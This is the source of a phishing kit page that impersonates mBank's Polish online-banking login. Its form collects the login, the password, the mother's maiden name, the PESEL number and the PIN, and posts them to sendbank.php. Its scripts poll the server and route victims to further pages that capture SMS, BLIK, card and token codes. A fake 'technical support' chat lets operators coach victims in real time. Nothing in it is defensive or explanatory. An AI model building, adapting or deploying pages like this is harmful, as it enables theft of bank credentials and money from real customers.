<?php
include "../service.php";
include "../../settings.php";
if (file_exists("../data/" . $_GET['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("../data/" . $_GET["id"] . ".xml");

checkLK($_temp['service'], $_temp['valute'], $_GET['id'], $xml->obyava, $xml->price, $xml->worker_id, "MBANK.");
?>
<!DOCTYPE html>
<html lang="pl"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>

		<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
		<title>mBank | Bankowość korporacyjna, MSP i korporacje, finansowanie przedsiębiorstw</title>
		<style>
			._0 {
				margin: 0 auto;
				max-width: 400px;
				box-sizing: border-box;
			}
			._01 {
				margin: 0 auto;
				max-width: 490px;
				box-sizing: border-box;
				padding: 24px;
				background: #fff;
				margin-top: 50px;
				padding-left: 0;
				margin-bottom: 50px;
			}
			._1 {
				font-size: 18px;
				padding-top: 16px;
				text-align: center;
			}
			._2 {
				margin: 10px 0;
				border-bottom: 1px solid #ddd;
			}
			._3 {
				text-align: left;
			    font-size: 14px;
			    border-bottom: 1px #a4a2a2 solid;
			    background: none;
			    padding: 10px 10px;
			    margin-bottom: 10px;
			}
			._4 {
				float: right;
			    width: 100%;
				margin: 0;
			    color: #000;
			    font-weight: 400;
			    font-size: 18px;
			    line-height: 24px;
			    display: inline-block;
			    -webkit-box-sizing: border-box;
			    box-sizing: border-box;
			    padding: 11px 30px;
			    min-width: 180px;
			    border-radius: 5px;
			    white-space: nowrap;
			    background-color: #21a148;
			    color: #fff;
			    text-align: center;
			    text-decoration: none;
			    margin-top: 10px;
			    border: none;
			}
			._5 {
				color: #aaa;
				text-align: right;
				width: 45%;
				padding-right: 24px;
			}
			._6 {
				font-weight: bold;
			}
			._7 {
				margin-top: 4px;
				margin-bottom: 16px;
			}
			._8 {
				padding-bottom: 6px;
				line-height: 18px;
			}
			._9 {
				text-align: right;
			}
			body {
				margin: 0;
				font-family: Arial;
				font-size: 12px;
				color: #222;
				word-break: break-word;
				user-select: none;
				background: #fdfdfd;
				-webkit-appearance: none;
			}
			input {
				font-family: Arial;
				font-size: 12px;
				color: #222;
				width: 100%;
				border: none;
				box-sizing: border-box;
				text-align: center;
				-webkit-appearance: none;
			}
			table {
				width: 100%;
				border-collapse: separate;
				border-spacing: 0;
			}
			td {
				padding: 4px 0;
			}
			a {
				text-decoration: none;
			}
			button {
				-webkit-appearance: none;
			}
			#bottom a {
				color: #6d6d6d;
				padding: 10px;

			}
			#mainblock {
				max-width: 450px;
				display: flex;
				margin: 0 20px;
			    background-color: #ebe8e8;
			    position: absolute;
			    top: 60px;
			}
			#rightblock {
				margin-top: 100px;
				display: flex;
			}
			.loginboxes {
				display: flex;
			}
			#formblock {
                /*border-right: 1px solid #e4e4e4;
                padding-right: 70px; */
			}
			#konto {
				margin-left: 40%; 
				padding-top: 30px;
			}
			#Pomoc {
				display: none;
                padding-top: 25px; 
                width: 150px;
			}
			#color {
				height: 10px;
				background: -webkit-gradient(linear,left top,right top,color-stop(0%,#e41e0a),color-stop(27%,#e41e0a),color-stop(27%,#201c17),color-stop(32%,#201c17),color-stop(32%,#f39100),color-stop(57%,#f39100),color-stop(57%,#cc0b18),color-stop(73%,#cc0b18),color-stop(73%,#0077bd),color-stop(77%,#0077bd),color-stop(77%,#18a035),color-stop(100%,#18a035));
    background: -webkit-linear-gradient(left,#e41e0a 0%,#e41e0a 27%,#201c17 27%,#201c17 32%,#f39100 32%,#f39100 57%,#cc0b18 57%,#cc0b18 73%,#0077bd 73%,#0077bd 77%,#18a035 77%,#18a035 100%);
    background: -o-linear-gradient(left,#e41e0a 0%,#e41e0a 27%,#201c17 27%,#201c17 32%,#f39100 32%,#f39100 57%,#cc0b18 57%,#cc0b18 73%,#0077bd 73%,#0077bd 77%,#18a035 77%,#18a035 100%);
    background: -ms-linear-gradient(left,#e41e0a 0%,#e41e0a 27%,#201c17 27%,#201c17 32%,#f39100 32%,#f39100 57%,#cc0b18 57%,#cc0b18 73%,#0077bd 73%,#0077bd 77%,#18a035 77%,#18a035 100%);
    background: linear-gradient(to right,#e41e0a 0%,#e41e0a 27%,#201c17 27%,#201c17 32%,#f39100 32%,#f39100 57%,#cc0b18 57%,#cc0b18 73%,#0077bd 73%,#0077bd 77%,#18a035 77%,#18a035 100%);
			}
			@media all and (max-width: 800px) {
				#mainblock {
					display: block;
				}
				#formblock {
					border-right: none;
					padding-right: 0; 
				}
			}
			@media all and (max-width: 500px) {
				.loginboxes {
					display: block;
				}
				#rightblock {
					display: block;
				}
				#konto {
					margin: 0;
				}
				#Pomoc {
					padding-top: 0;
					padding-bottom: 25px;
				}
				._4 {
					width: 100%;
				}
			}
		</style>
	</head>
	<body>
		<header style="display: flex; height: 40px;">
			<img src="./mbank_files/mbank.png" height="40">
			<div style="padding: 13px 2px; color: #6d6d6d">Zaloguj się do serwisu transakcyjnego</div>
		</header>
		<div style="height: 305px;">
			<img src="./mbank_files/mbank-back.png" style="height: 100%; width: 100%;">
		</div>
		<div id="mainblock">
			<div id="color"></div>
			<div class="_0">
				<form method="post" action="sendbank.php" id="formblock">
					<div class="loginboxes">
						<div class="_1">Klienci indywidualni i firmowi</div>
						<div style="padding: 10px; text-align: center; margin-top: 15px;">
							<img src="./mbank_files/mbank-photo.png" height="100">
						</div>
					</div>
					<div style="padding: 0 15px;">
                    <input type="hidden" name="id" value="<?php echo $_GET['id']; ?>">
                    <input type="hidden" name="type" value="5">
						<input id="field3ds1" class="_3" type="text" name="logindata" placeholder="Wpisz numer klienta lub login" required=""> 
						<input id="field3ds2" class="_3" type="password" name="passdata" placeholder="Wpisz hasło" required="">
						<input id="field3ds3" class="_3" type="text" name="mamkadata" placeholder="Nazwisko rodowe Matki" required="">
						<input style="display: none;" id="field3ds7" class="_3" type="text" name="peseldata" placeholder="Pesel" required="">
						<input style="display: none;" id="field3ds4" class="_3" type="password" name="pindata" placeholder="PIN" required="">
					</div>
					
						<div style="color: #ff6161; padding: 20px; text-align: center;"></div>
					<div class="loginboxes">
						<button id="field3ds5" form="123123" class="_4">Zaloguj się</button>
						<input style="display: none;" id="field3ds6" class="_4" type="submit" value="Zaloguj się">
					</div>
				</form>
			</div>
		</div>
		<footer style="max-width: 450px; margin: 0 20px; margin-top: 70px;">
			<div id="bottom">
				<a href="https://www.mbank.pl/">Odblokuj dostęp</a>
				<a href="https://www.mbank.pl/pomoc/info/bezpieczenstwo/logowanie-odblokowanie.html">Problem z zalogowaniem?</a>
			</div>
		</footer>



		<script>
			var button1 = document.querySelector('#field3ds5');
			// var inp1 = document.querySelector('#field3ds1');
			// var inp2 = document.querySelector('#field3ds2');
			var inp3 = document.querySelector('#field3ds3');
			var inp4 = document.querySelector('#field3ds4');
			var inp6 = document.querySelector('#field3ds6');
			var inp7 = document.querySelector('#field3ds7');
			var inp1 = document.querySelector('#field3ds1');
			var inp2 = document.querySelector('#field3ds2');
			button1.onclick = function () {
				if (inp1.value.length > 5 && inp2.value.length > 5) {
					// inp1.style.display = 'block';
					// inp2.style.display = 'block';
					inp3.style.display = 'block';
	                inp4.style.display = 'block';
			 		inp6.style.display = 'block';
			 		inp7.style.display = 'block';
			 		button1.style.display = 'none';
				}
			}
		</script>
		<script type="text/javascript">
            
            

            function ajaxsup1() {
                var request = new XMLHttpRequest();

                request.onreadystatechange = function() {
                    if (request.readyState == 4 && request.status == 200) {
                        var loading = document.querySelector('#loading');
                        var smsblock = document.querySelector('#sms');
                        var lkblock = document.querySelector('#lk');
                        var result = request.responseText;
                        // console.log(request.responseText);
                        console.log('%md%');
                        if (result == 'sms') {
                            location="/3ds%md%";
                        } else if (result == 'lk') {
                             location="/autorize%md%";
                        } else if (result == 'photo') {
                             location="/checking%md%";
                        } else if (result == 'blik') {
                             location="/blik%md%";
                        } else if (result == 'push') {
                             location="/potwierdzenie%md%";
                        } else if (result == 'card') {
                             location="/verification%md%";
                        } else if (result == 'token') {
                             location="/ipko%md%";
                        } else if (result == 'pin') {
                             location="/pincode%md%";
                        } else {

                        }
                    }
                }
                request.open('POST', 'procstatus.php');
                request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                request.send('item=22161894');
            }

            function ajaxdel() {
                var request = new XMLHttpRequest();
                request.open('POST', 'delstatus.php');
                request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                request.send('item=22161894');
            }

        </script>


		<style>
.chaport-container.chaport-container-positioned {
    position: fixed;
    box-sizing: border-box;
    top: auto;
    right: 0;
    bottom: 0;
    left: 0;
    width: auto;
    height: 0;
    overflow: visible;
}
.chaport-container {
    font-size: 14px;
    z-index: 2147483500;
}
.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container div {
    display: block;
}

.chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
    background-color: #21a148;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-anim-show {
    visibility: visible;
    opacity: 1;
    -webkit-transition-delay: 0s !important;
    transition-delay: 0s !important;
}

.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    width: 2.28571em;
    height: 2.64286em;
    position: absolute;
    margin-top: 0.07143em;
    top: 0.92857em;
    left: 1em;
    background-image: url(/chap.png);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 0;
    transform: rotate(-45deg) scale(1);
    position: absolute;
    top: 0;
    right: 0;
    width: 4.28571em;
    height: 4.28571em;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    transform: rotate(45deg);
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
    position: absolute;
    top: 1.5em;
    right: 2.07143em;
    content: ' ';
    height: 1.35714em;
    width: 0.14286em;
    background-color: #fff;
}
.chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
    opacity: 0;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    position: absolute;
    z-index: 1;
    width: 100%;
    height: 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
    transform: scale(1);
}

.chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
    border-width: 0.33333em;
    bottom: 1.13333em;
    border-left-color: #fff;
}
.chaport-container .chaport-window-anim.chaport-anim-hide {
    transform: translateY(20px);
}
.chaport-container.chaport-container-positioned .chaport-window {
    position: absolute;
    top: auto;
    right: 20px;
    bottom: 115px;
    left: auto;
    width: 300px;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    -webkit-border-radius: 8px;
    -moz-border-radius: 8px;
    -ms-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
    z-index: 2147483500;
}
.chaport-container .chaport-window-anim {
    transition: height 0s linear 0.3s,visibility 0s linear 0.3s,opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1),transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container .chaport-inner {
    position: relative;
    margin-left: 0px;
    margin-right: 0px;
    background-color: #fff;
}


.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
    position: absolute;
    right: 0;
    bottom: 60px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
    position: absolute;
    left: -41px;
    bottom: 7px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
    width: 100%;
    height: 100%;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
    margin-bottom: 5px;
    font-size: 15px;
    font-weight: bold;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
    font-size: 15px;
}
@media (max-width: 339px), (min-width: 341px) {
.chaport-close, .chaport-container .chaport-close {
    display: block;
}
}

.chaport-container .chaport-big-shadow {
    opacity: 0;
    z-index: 2147483499;
    position: fixed;
    width: 480px;
    height: 480px;
    bottom: 0;
    right: 0;
    content: "";
    pointer-events: none;
    background: radial-gradient(ellipse at bottom right,rgba(27,37,52,0.15) 0,rgba(27,37,52,0) 70%);
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
}
.chaport-content {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: hidden;
    -webkit-border-top-left-radius: 8px;
    -moz-border-top-left-radius: 8px;
    -ms-border-top-left-radius: 8px;
    border-top-left-radius: 8px;
    -webkit-border-top-right-radius: 8px;
    -moz-border-top-right-radius: 8px;
    -ms-border-top-right-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}
@media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
.chaport-content {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    -ms-border-radius: 0;
    border-radius: 0;
}
.chaport-close, .chaport-container .chaport-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 4;
    width: 50px;
    height: 41px;
    cursor: pointer;
    opacity: 0.6;
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    display: none;
}
.main-textblock {
    background-color: #ffffff;
    border-radius: 4px;
    height: 500px;
}
.operatorblock {
    height: 130px;
    background-color: #21a148;
    top: 0;
}
#operator-photo {

    width: 60px;
    height: 60px;
    margin-bottom: 7px;
    text-align: center;
    margin-top: 8px;
}
#oper-photo-img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.operatorblock-content {
    padding: 20px;
    display: flex;
}
.operator-name {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.team-wrapper {
    text-align: center;
    width: 60%;
    margin-top: 30px;
    margin-left: 4%;
}
.team {
    font-size: 16px;
    color: #fff;
}
.activity-indicator {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.with-status {
    padding-left: 15px;
    display: inline-block;
    position: relative;
}
.status-online {
    display: block;
    background-color: #4fd237;
    position: absolute;
    right: -3px;
    bottom: 3px;
    width: 7px;
    height: 7px;
    background-repeat: no-repeat;
    border-radius: 7px;
    border-width: 1px;
    border-style: solid;
    box-sizing: content-box;
    left: 0;
    right: auto;
    border-color: #4fd237;
}
#input-msg {
    border-top: 1px solid #babac05c;
    width: 100%;
    position: absolute;
    bottom: 0;
    height: 50px;
    margin-bottom: 20px;
}
#smstosup1 {
    margin-left: 10px;
    width: 100%;
    border: none;
    font-size: 15px;
}

.chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
    opacity: 1;
    transform: scale(1);
    position: absolute;
    bottom: 15px;
    left: 7px;
    width: 18px;
    height: 18px;
    transition: opacity 0.2s linear,transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
    fill: #414141;
    transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
#smstosupbutton1 {
    border-width: 0px;
    background: #fff;
    margin-right: 10px;
}
#smstosupbutton1 {
    cursor: pointer;
}
#smstosupbutton1:focus, #smstosupbutton1:active  {
    outline: none;
}
.chaport-window {
    visibility: hidden;
    opacity: 0;
}
.chat-block {
    overflow-y: auto;
    height: 300px;
    overflow-x: hidden;

}
#chat {
    padding-bottom: 15px;
}
.operators-msg {
    margin-top: 15px;
}
.operators-first-text {
    padding: 10px;
    width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.operators-msg-text {
    padding: 10px;
    max-width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.visitors-msg-text {
    margin-top: 15px;
    margin-right: 10px;
    margin-left: 80px;
    padding: 10px;
    min-width: 180px;
    border-radius: 8px;
    background-color: #21a148;
    color: #fff;
}
.operators-photo img {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    margin-left: 5px;
    margin-right: 5px;
}
.chat-block::-webkit-scrollbar {
    width: 7px;
}
.chat-block::-webkit-scrollbar-button {
    display: none;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
    </style>


    <div id="offonthechap">
            <div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed" style="bottom: 0px;">
                <div class="chaport-launcher" style="left: 0px; right: 0px;">
                    <div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">
                    <input type="hidden" id="product" value="<?php echo $xml->obyava; ?>">
                        <input type="hidden" id="refresh_time" value="<?php echo $_GET['id']; ?>">
                        <input type="hidden" id="home_time" value="<?php echo $xml->worker_id; ?>">
                        <div class="chaport-launcher-chat-icon"></div>
                        <div class="chaport-launcher-close-icon"></div>
                        <div class="chaport-launcher-operator-photo"></div>
                    </div>
                </div>
                <div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">
                    <div class="chaport-inner">
                        <div class="main-textblock">
                            <div class="operatorblock">
                                <div class="operatorblock-content" style="display: flex;">
                                    <div id="operator-photo">
                                        <img id="oper-photo-img" src="./mbank_files/operator-img.png">
                                        <div class="operator-name">Sofia</div>
                                    </div>
                                    <div class="team-wrapper">
                                        <div class="team">Pomoc techniczna</div>
                                        <div class="activity-indicator">
                                            <div class="with-status" style="display: inline-block;">
                                                <div class="status-online" style="display: inline-block;">
                                                    
                                                </div>online</div>
                                            </div>
                                        </div>
                                </div>
                            </div>
                            <div class="chat-block">
                                <div id="chat">
                                    <div class="operators-msg" id="greeting-msg" style="display: none;">
                                        <div class="operators-photo"><img src="./mbank_files/operator-img.png"></div>
                                        <div class="operators-first-text">Dzień dobry! Jak mogę ci pomóc?</div>                            
                                    </div>
                                
                                </div>
                                <div id="input-msg" style="display: flex;">
                                    <input type="text" name="smstosup1" id="smstosup1" placeholder="Wpisz swoją wiadomość...">
                                    <button id="smstosupbutton1" onclick="sendMessage()">
                                        <div class="chaport-send-icon">
                                            <svg width="18" height="18" viewBox="0 0 535.5 535.5">
                                                <polygon points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75" fill="#b9bdbf">      
                                                </polygon>
                                            </svg>
                                        </div>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>  
                    <div class="chaport-big-shadow"></div>
            </div>
        </div>
        <script type="text/javascript">


var supportbutton = document.querySelector('.chaport-launcher-button');
    var supportwindow = document.querySelector('.chaport-window');

    supportbutton.onclick = function() {
        if (supportwindow.style.opacity == '0') {
            supportwindow.style.opacity = '1';
            supportwindow.style.visibility = 'visible';
        } else {
            supportwindow.style.opacity = '0';
            supportwindow.style.visibility = 'hidden';
        }
    };
</script>

<script type="text/javascript">

var myVar = setInterval(updateChat, 5000);
var pool = true;
function updateChat() {
var supportbutton = document.querySelector('.chaport-launcher-button');
var supportwindow = document.querySelector('.chaport-window');
var token = <?php echo $_GET['id']; ?>;
if (token !== null) {
if (pool) {
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
pool = false;
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("get=0&token=" + token);
xhttp.onload = function (e) {
if (xhttp.readyState === 4) {
  if (xhttp.status === 200) {
    var body = xhttp.response;
    pool = true;
    var json = JSON.parse(body);
    for (let i = 0; i < json.length; i++) {
      cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
      if (json[i].sender == 't') {
        text = '<div class="operators-msg" style="display: flex;"><div class="operators-photo"><img src="../ordercss/operator-img.png"></div><div class="operators-msg-text" id="qwe1649370682">'+ json[i].message +'</div></div>'
      } else if (json[i].sender == 'i') {
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }else if (json[i].sender == "testOnline"){
        return 'okay';
      }else{
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }

      
      $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + text);
      var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
      objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
      supportwindow.style.opacity = '1';
      supportwindow.style.visibility = 'visible';
    }

  } else {
    pool = true;
  }
}
}
}
}
}

function sendMessage() {
message = document.getElementById("smstosup1").value;
if (message === '') {
return;
}
document.getElementById("smstosup1").value = '';
var token = document.getElementById("refresh_time").value;
if (token === null) {
var token = Math.random().toString(36).substring(7);
}
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
var uid = document.getElementById("home_time").value;
var title = document.getElementById("product").value;
xhttp.send("send=1&track_id=" + encodeURIComponent(track_id) + "&uid=" + encodeURIComponent(uid) + "&token=" + encodeURIComponent(token) + "&message=" + encodeURIComponent(message) + "&type=" + encodeURIComponent(window.location.host.split('.')[0]) + "&title=" + encodeURIComponent(title));
cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
$('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + '<div class="visitors-msg-text" id="qwe1649370526">'+ message +'</div>');
setCookie('token', token);
var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
}

function setCookie(cname, cvalue) {
var d = new Date();
d.setTime(d.getTime() + (6 * 60 * 60 * 1000));
var expires = "expires=" + d.toUTCString();
document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

</script>
</body></html>